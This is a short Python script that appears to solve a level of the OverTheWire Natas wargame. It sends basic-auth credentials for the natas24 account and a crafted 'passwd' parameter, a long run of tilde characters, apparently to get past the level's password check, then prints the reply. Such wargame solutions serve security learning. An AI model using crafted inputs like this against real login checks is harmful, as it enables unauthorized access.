#!/usr/bin/python

import requests


auth = ("natas24", "OsRmXFguozKpTZZ5X14zNO43379LZveg")

url = "http://natas24.natas.labs.overthewire.org?"

params = {
    "passwd": "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
}

r = requests.get(url, params=params, auth=auth)

print(r.text)
print('')